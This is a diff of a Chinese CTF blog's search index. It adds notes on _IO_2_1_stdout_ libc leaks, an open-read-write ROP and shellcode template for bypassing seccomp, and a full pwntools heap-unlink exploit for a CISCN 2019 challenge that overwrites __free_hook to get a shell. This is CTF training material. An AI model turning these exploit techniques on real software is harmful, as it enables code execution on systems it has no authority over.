@@ -1,6 +1,39 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>_IO_2_1_stdout_</title>
+    <url>/2024/07/19/IO_2_1_stdout/</url>
+    <content><![CDATA[<hr>
+<h1 id="IO-2-1-stdout-的利用（速成）"><a href="#IO-2-1-stdout-的利用（速成）" class="headerlink" title="_IO_2_1_stdout_的利用（速成）"></a>_IO_2_1_stdout_的利用（速成）</h1> <span id="more"></span>        
+
+<p>详情可看：<br><a href="https://blog.csdn.net/qq_41202237/article/details/113845320">hollk</a> </p>
+<p><a href="https://bbs.kanxue.com/thread-275968.htm#msg_header_h1_2">国资</a></p>
+<h3 id="IO-FILE-plus结构体"><a href="#IO-FILE-plus结构体" class="headerlink" title="_IO_FILE_plus结构体"></a>_IO_FILE_plus结构体</h3><pre><code>struct _IO_FILE_plus &#123;
+    FILE file;
+    const struct _IO_jump_t *vtable;
+&#125;
+</code></pre>
+<p>其中32 位的file到 vtable 偏移为 0x94，64 位偏移为 0xd8</p>
+<br>
+
+<h3 id="IO-2-1-stdout-结构体"><a href="#IO-2-1-stdout-结构体" class="headerlink" title="_IO_2_1_stdout_结构体"></a>_IO_2_1_stdout_结构体</h3><p><img src="/images/stdout.png" alt="图片">   </p>
+<p>关于利用stdout来泄露libc主要设置以下结构的值：   </p>
+<pre><code>1、flag为0xfbad18xx，一般为0xfdab1800
+
+2、更改_IO_read_ptr、_IO_read_end、_IO_read_base指针的值为0.
+
+3、_IO_write_base改为需要泄露的地址，_IO_write_ptr改为泄露地址的终止值。
+</code></pre>
+<p>改完了这些，就可以通过调用printf或者puts函数来打印出地址了。</p>
+<hr>
+]]></content>
+      <tags>
+        <tag>pwn</tag>
+        <tag>IO</tag>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>format利用</title>
     <url>/2024/07/20/Fmt/</url>
     <content><![CDATA[<hr>
@@ -382,36 +415,113 @@ _IO_str_jumps
       </tags>
   </entry>
   <entry>
-    <title>_IO_2_1_stdout_</title>
-    <url>/2024/07/19/IO_2_1_stdout/</url>
+    <title>orw</title>
+    <url>/2024/08/10/orw%E6%A8%A1%E6%9D%BF/</url>
     <content><![CDATA[<hr>
-<h1 id="IO-2-1-stdout-的利用（速成）"><a href="#IO-2-1-stdout-的利用（速成）" class="headerlink" title="_IO_2_1_stdout_的利用（速成）"></a>_IO_2_1_stdout_的利用（速成）</h1> <span id="more"></span>        
+<h1 id="orw-模板"><a href="#orw-模板" class="headerlink" title="orw 模板"></a>orw 模板</h1> <span id="more"></span>        
 
-<p>详情可看：<br><a href="https://blog.csdn.net/qq_41202237/article/details/113845320">hollk</a> </p>
-<p><a href="https://bbs.kanxue.com/thread-275968.htm#msg_header_h1_2">国资</a></p>
-<h3 id="IO-FILE-plus结构体"><a href="#IO-FILE-plus结构体" class="headerlink" title="_IO_FILE_plus结构体"></a>_IO_FILE_plus结构体</h3><pre><code>struct _IO_FILE_plus &#123;
-    FILE file;
-    const struct _IO_jump_t *vtable;
-&#125;
-</code></pre>
-<p>其中32 位的file到 vtable 偏移为 0x94，64 位偏移为 0xd8</p>
+<h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a><em>tips</em></h3><p>liunx64：<br>1、read 0、readv 19<br>2、write 1、writev 20<br>3、open 2、openat 257<br>4、sendfile 40    </p>
 <br>
+ 
+<h2 id="orw的原型及参数"><a href="#orw的原型及参数" class="headerlink" title="orw的原型及参数"></a>orw的原型及参数</h2><pre><code>1. read
+原型: ssize_t read(int fd, void *buf, size_t count);
+参数:
+fd：文件描述符。
+buf：指向存储读取数据的缓冲区的指针。
+count：要读取的字节数。      
 
-<h3 id="IO-2-1-stdout-结构体"><a href="#IO-2-1-stdout-结构体" class="headerlink" title="_IO_2_1_stdout_结构体"></a>_IO_2_1_stdout_结构体</h3><p><img src="/images/stdout.png" alt="图片">   </p>
-<p>关于利用stdout来泄露libc主要设置以下结构的值：   </p>
-<pre><code>1、flag为0xfbad18xx，一般为0xfdab1800
+2. readv
+原型: ssize_t readv(int fd, const struct iovec *iov, int iovcnt);
+参数:
+fd：文件描述符。
+iov：指向 iovec 结构体数组的指针，每个 iovec 结构体包含一个缓冲区及其大小。
+iovcnt：iovec 结构体的数量。  
 
-2、更改_IO_read_ptr、_IO_read_end、_IO_read_base指针的值为0.
+3. write
+原型: ssize_t write(int fd, const void *buf, size_t count);
+参数:
+fd：文件描述符。
+buf：指向要写入的数据的缓冲区的指针。
+count：要写入的字节数。
 
-3、_IO_write_base改为需要泄露的地址，_IO_write_ptr改为泄露地址的终止值。
+4. writev
+原型: ssize_t writev(int fd, const struct iovec *iov, int iovcnt);
+参数:
+fd：文件描述符。
+iov：指向 iovec 结构体数组的指针，每个 iovec 结构体包含一个缓冲区及其大小。
+iovcnt：iovec 结构体的数量。
+
+5. open
+原型: int open(const char *pathname, int flags, mode_t mode);
+参数:
+pathname：要打开的文件的路径。
+flags：打开文件的标志，如 O_RDONLY、O_WRONLY、O_RDWR。
+mode：文件权限，仅在使用 O_CREAT 标志时需要。
+
+6. openat
+原型: int openat(int dirfd, const char *pathname, int flags, mode_t mode);
+参数:
+dirfd：目录文件描述符，表示相对路径的基准目录（可以是 AT_FDCWD）。
+pathname：要打开的文件的路径。
+flags：打开文件的标志，如 O_RDONLY、O_WRONLY、O_RDWR。
+mode：文件权限，仅在使用 O_CREAT 标志时需要。
+
+7. sendfile
+原型: ssize_t sendfile(int out_fd, int in_fd, off_t *offset, size_t count);
+参数:
+out_fd：目标文件描述符（通常是套接字）。
+in_fd：源文件描述符。
+offset：偏移量的指针，用于指定从源文件中开始的字节位置（如果为 NULL，从当前文件位置开始）。
+count：要发送的字节数。
 </code></pre>
-<p>改完了这些，就可以通过调用printf或者puts函数来打印出地址了。</p>
+<h3 id="模版"><a href="#模版" class="headerlink" title="模版"></a><em>模版</em></h3><p>只禁用了execve   </p>
+<pre><code>o=base+libc.sym[&#39;open&#39;]
+r=base+libc.sym[&#39;read&#39;]
+w=base+libc.sym[&#39;write&#39;]
+orw=p64(rdi)+p64(flag)+p64(rsi)+p64(0)+p64(o)
+orw+=p64(rdi)+p64(3)+p64(rsi)+p64(flag)+p64(rdx_r)+p64(0x30)+p64(0)+p64(r)
+orw+=p64(rdi)+p64(1)+p64(rsi)+p64(flag)+p64(rdx_r)+p64(0x30)+p64(0)+p64(w)
+</code></pre>
+<p>其中的寄存器的呈现形式及赋值视情况而变动。</p>
+ <br>
+ ### <em>sendfile</em>
+ 禁用open、execve、read、write、readv、writev
+
+<pre><code>asm(&#39;&#39;&#39;
+mov rdi,3;                    #openat调用
+mov rdx,0;
+mov r10,0;
+mov rsi,flag;                 #flag地址
+mov rax,257;
+syscall;
+
+mov rdi,0;                    #sendfile调用  
+mov rsi,3;
+mov rdi,1;
+xor rdx,rdx;
+mov r10,0x33;                 #读取大小
+mov rax,40;
+syscall;
+
+
+mov rax,60;                    #exit调用
+xor rdi,rdi;
+syscall;
+&#39;&#39;&#39;
+)
+</code></pre>
+<p>其中指令的表现形式也视具体情况而变动。<br><br><br>比正常情况下少了8字节</p>
+<pre><code>o = libc_base + libc.sym[&#39;open&#39;]
+sendfile = libc_base + libc.sym[&#39;sendfile&#39;]
+orw = p64(rdi)+p64(flag)+p64(rsi)+p64(0)+p64(o)
+orw+=p64(rdi)+p64(1)+p64(rsi)+p64(3)+p64(rdx)+p64(0)+p64(r10)+p64(r/w_size)+p64(sendfile)
+</code></pre>
 <hr>
 ]]></content>
       <tags>
         <tag>pwn</tag>
-        <tag>IO</tag>
-        <tag>CTF</tag>
+        <tag>ctf</tag>
+        <tag>orw</tag>
       </tags>
   </entry>
   <entry>
@@ -988,7 +1098,7 @@ _wide_data-&gt;_wide_vtable-&gt;overflow设置为地址C用于劫持RIP，即满
 </code></pre>
 <p>如上</p>
 <h3 id="2、行为"><a href="#2、行为" class="headerlink" title="2、行为"></a>2、行为</h3><p>unlink的行为顾名思义，是进行的脱链的操作。<br>将一个free状态的chunk，从双向链表中脱离出来。<br><br></p>
-<h2 id="unlink漏洞"><a href="#unlink漏洞" class="headerlink" title="unlink漏洞"></a>unlink漏洞</h2><p>由于脱链后我们控制内存块会发生改变，被unlink的内存块会被移除。<br>所以如果我们可以控制这个被unlink的chunk，改变其fd与bk那我们就可以控制任意的内存块。<br>但是由于在后续glibc中增添了新的保护，所以导致其利用受限</p>
+<h2 id="unlink漏洞"><a href="#unlink漏洞" class="headerlink" title="unlink漏洞"></a>unlink漏洞</h2><p>由于脱链后我们控制内存块会发生改变，被unlink的内存块会被移除。<br>所以如果我们可以控制这个被unlink的chunk，改变其fd与bk那我们就可以控制任意的fd内存块。<br>但是由于在后续glibc中增添了新的保护，所以导致其利用受限</p>
 <pre><code>FD-&gt;bk==ptr;
 BK-&gt;fd==ptr;
        
@@ -997,7 +1107,7 @@ BK-&gt;fd==ptr;
 <pre><code>FD-&gt;bk=ptr-0x18
 BK-&gt;fd=ptr-0x10
 </code></pre>
-<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="unlink-1"><a href="#unlink-1" class="headerlink" title="unlink"></a>unlink</h3><p>EXP</p>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="unlink-1"><a href="#unlink-1" class="headerlink" title="unlink"></a>unlink</h3><p>EXP:</p>
 <pre><code>#!/usr/bin/python3
 from pwn import *
 from LibcSearcher import *
@@ -1087,119 +1197,110 @@ edit(3,b&#39;/bin/sh\x00&#39;)
 free(3)
 inter()
 </code></pre>
-]]></content>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>orw</title>
-    <url>/2024/08/10/orw%E6%A8%A1%E6%9D%BF/</url>
-    <content><![CDATA[<hr>
-<h1 id="orw-模板"><a href="#orw-模板" class="headerlink" title="orw 模板"></a>orw 模板</h1> <span id="more"></span>        
-
-<h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a><em>tips</em></h3><p>liunx64：<br>1、read 0、readv 19<br>2、write 1、writev 20<br>3、open 2、openat 257<br>4、sendfile 40    </p>
 <br>
- 
-<h2 id="orw的原型及参数"><a href="#orw的原型及参数" class="headerlink" title="orw的原型及参数"></a>orw的原型及参数</h2><pre><code>1. read
-原型: ssize_t read(int fd, void *buf, size_t count);
-参数:
-fd：文件描述符。
-buf：指向存储读取数据的缓冲区的指针。
-count：要读取的字节数。      
 
-2. readv
-原型: ssize_t readv(int fd, const struct iovec *iov, int iovcnt);
-参数:
-fd：文件描述符。
-iov：指向 iovec 结构体数组的指针，每个 iovec 结构体包含一个缓冲区及其大小。
-iovcnt：iovec 结构体的数量。  
+<h3 id="CISCN-2019华南-PWN1"><a href="#CISCN-2019华南-PWN1" class="headerlink" title="[CISCN 2019华南]PWN1"></a>[CISCN 2019华南]PWN1</h3><em>
+tips:    
+这里的got表保护是开启的
+</em>
+EXP:
 
-3. write
-原型: ssize_t write(int fd, const void *buf, size_t count);
-参数:
-fd：文件描述符。
-buf：指向要写入的数据的缓冲区的指针。
-count：要写入的字节数。
+<pre><code>#!/usr/bin/python3
+from pwn import *
+from LibcSearcher import *
+from ctypes import *
+import os
 
-4. writev
-原型: ssize_t writev(int fd, const struct iovec *iov, int iovcnt);
-参数:
-fd：文件描述符。
-iov：指向 iovec 结构体数组的指针，每个 iovec 结构体包含一个缓冲区及其大小。
-iovcnt：iovec 结构体的数量。
+context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)
+#context(os=&quot;linux&quot;, arch=&quot;i386&quot;, log_level=&quot;debug&quot;)
 
-5. open
-原型: int open(const char *pathname, int flags, mode_t mode);
-参数:
-pathname：要打开的文件的路径。
-flags：打开文件的标志，如 O_RDONLY、O_WRONLY、O_RDWR。
-mode：文件权限，仅在使用 O_CREAT 标志时需要。
+#context.terminal = [&quot;xfce4-terminal&quot;, &quot;-e&quot;]
 
-6. openat
-原型: int openat(int dirfd, const char *pathname, int flags, mode_t mode);
-参数:
-dirfd：目录文件描述符，表示相对路径的基准目录（可以是 AT_FDCWD）。
-pathname：要打开的文件的路径。
-flags：打开文件的标志，如 O_RDONLY、O_WRONLY、O_RDWR。
-mode：文件权限，仅在使用 O_CREAT 标志时需要。
+p=process(&quot;./pw1&quot;)
+#p= remote(&#39;node5.anna.nssctf.cn&#39;,23375)
+libc = ELF(&quot;libc.so.6&quot;)
+elf = ELF(&quot;./pw1&quot;)
 
-7. sendfile
-原型: ssize_t sendfile(int out_fd, int in_fd, off_t *offset, size_t count);
-参数:
-out_fd：目标文件描述符（通常是套接字）。
-in_fd：源文件描述符。
-offset：偏移量的指针，用于指定从源文件中开始的字节位置（如果为 NULL，从当前文件位置开始）。
-count：要发送的字节数。
+def op():
+    gdb.attach(p)
+    pause()
+
+def inter():
+    p.interactive()
+
+def sa(content,payload):
+    p.sendafter(content,payload)
+
+def sla(content,payload):
+    p.sendlineafter(content,payload)
+
+def uc64():
+    u64(p.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8,b&quot;\\x00&quot;))
+
+def uc32():
+    u32(p.recvuntil(b&quot;\\xf7&quot;)[-4:].ljust(4,b&quot;\\x00&quot;))
+
+def exec_fmt(pad):
+    p = process(&quot;./fmt&quot;)
+    p.send(pad)
+    return p.recv()
+def rc(content):
+    p.recvuntil(content)
+
+def l(choose):
+sla(&quot;4.show&quot;,str(choose))
+
+def add(index,size,content):
+l(1)
+sla(&quot;index:&quot;,str(index))
+sla(&quot;size:&quot;,str(size))
+sa(&quot;content:&quot;,content)
+
+def free(index):
+l(2)
+sla(&quot;index&quot;,str(index))
+
+def edit(index,content):
+l(3)
+sla(&quot;index:&quot;,str(index))
+sa(&quot;content:&quot;,content)
+
+def show(index):
+l(4)
+sla(&quot;index:&quot;,str(index))
+
+for i in range(1,8):
+add(i,0xf8,b&#39;a&#39;)
+add(32,0xf8,b&#39;b&#39;)
+add(9,0xf8,b&#39;a&#39;)
+add(8,0xf8,b&#39;/bin/sh\x00&#39;)
+add(31,0xf8,b&#39;b&#39;)
+add(30,0xf8,b&#39;a&#39;)
+tar=0x6021E0
+fd=tar-0x18
+bk=tar-0x10
+payload=p64(0)+p64(0xf1)+p64(fd)+p64(bk)
+payload=payload.ljust(0xf0,b&#39;\xff&#39;)+p64(0xf0)                                                          
+for i in range(1,8):
+        free(i)
+edit(32,payload)
+free(9)                                                                                                    //unlink
+free_got=0x400700
+edit(32,p64(elf.got[&#39;puts&#39;])*2+p64(0x6021d8)+p64(0x6021b8)+p64(0)*26+p64(0xfffffffffffff))                //leak libc
+show(30)
+got=u64(p.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8,b&#39;\x00&#39;))
+base=got-libc.sym[&#39;puts&#39;]
+sys=base+libc.sym[&#39;system&#39;]
+free_hook=base+libc.sym[&#39;__free_hook&#39;]
+print(&quot;base=&quot;,hex(base))
+edit(31,p64(libc.sym[&#39;__free_hook&#39;]+base))                                                               //getshell
+edit(31,p64(sys))
+free(8)
+inter()
 </code></pre>
-<h3 id="模版"><a href="#模版" class="headerlink" title="模版"></a><em>模版</em></h3><p>只禁用了execve   </p>
-<pre><code>o=base+libc.sym[&#39;open&#39;]
-r=base+libc.sym[&#39;read&#39;]
-w=base+libc.sym[&#39;write&#39;]
-orw=p64(rdi)+p64(flag)+p64(rsi)+p64(0)+p64(o)
-orw+=p64(rdi)+p64(3)+p64(rsi)+p64(flag)+p64(rdx_r)+p64(0x30)+p64(0)+p64(r)
-orw+=p64(rdi)+p64(1)+p64(rsi)+p64(flag)+p64(rdx_r)+p64(0x30)+p64(0)+p64(w)
-</code></pre>
-<p>其中的寄存器的呈现形式及赋值视情况而变动。</p>
- <br>
- ### <em>sendfile</em>
- 禁用open、execve、read、write、readv、writev
-
-<pre><code>asm(&#39;&#39;&#39;
-mov rdi,3;                    #openat调用
-mov rdx,0;
-mov r10,0;
-mov rsi,flag;                 #flag地址
-mov rax,257;
-syscall;
-
-mov rdi,0;                    #sendfile调用  
-mov rsi,3;
-mov rdi,1;
-xor rdx,rdx;
-mov r10,0x33;                 #读取大小
-mov rax,40;
-syscall;
-
-
-mov rax,60;                    #exit调用
-xor rdi,rdi;
-syscall;
-&#39;&#39;&#39;
-)
-</code></pre>
-<p>其中指令的表现形式也视具体情况而变动。<br><br><br>比正常情况下少了8字节</p>
-<pre><code>o = libc_base + libc.sym[&#39;open&#39;]
-sendfile = libc_base + libc.sym[&#39;sendfile&#39;]
-orw = p64(rdi)+p64(flag)+p64(rsi)+p64(0)+p64(o)
-orw+=p64(rdi)+p64(1)+p64(rsi)+p64(3)+p64(rdx)+p64(0)+p64(r10)+p64(r/w_size)+p64(sendfile)
-</code></pre>
-<hr>
 ]]></content>
       <tags>
         <tag>pwn</tag>
-        <tag>ctf</tag>
-        <tag>orw</tag>
       </tags>
   </entry>
 </search>
